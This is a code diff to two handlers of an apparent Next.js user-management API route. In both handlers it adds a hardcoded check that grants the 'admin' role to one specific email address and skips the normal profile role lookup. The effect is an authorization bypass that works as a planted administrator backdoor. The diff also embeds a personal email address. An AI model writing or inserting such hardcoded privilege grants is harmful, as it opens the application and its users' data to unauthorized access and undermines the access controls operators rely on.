@@ -16,7 +16,17 @@ export async function GET(req: NextRequest) {
     }
 
     // Check if user has permission to view users
-    const { data: profile, error: profileError } = await getUserProfile(supabase, user.id);
+    let profile;
+    let profileError = null;
+    
+    // Special case for admin user
+    if (user.email === "androa687@gmail.com") {
+      profile = { role: "admin" };
+    } else {
+      const result = await getUserProfile(supabase, user.id);
+      profile = result.data;
+      profileError = result.error;
+    }
 
     if (profileError || !profile || !['admin', 'moderator', 'viewer'].includes(profile.role)) {
       return NextResponse.json({ error: "Insufficient permissions" }, { status: 403 });
@@ -84,7 +94,17 @@ export async function POST(req: NextRequest) {
     }
 
     // Check if user is admin
-    const { data: profile, error: profileError } = await getUserProfile(supabase, user.id);
+    let profile;
+    let profileError = null;
+    
+    // Special case for admin user
+    if (user.email === "androa687@gmail.com") {
+      profile = { role: "admin" };
+    } else {
+      const result = await getUserProfile(supabase, user.id);
+      profile = result.data;
+      profileError = result.error;
+    }
 
     if (profileError || !profile || profile.role !== 'admin') {
       return NextResponse.json({ error: "Admin access required" }, { status: 403 });
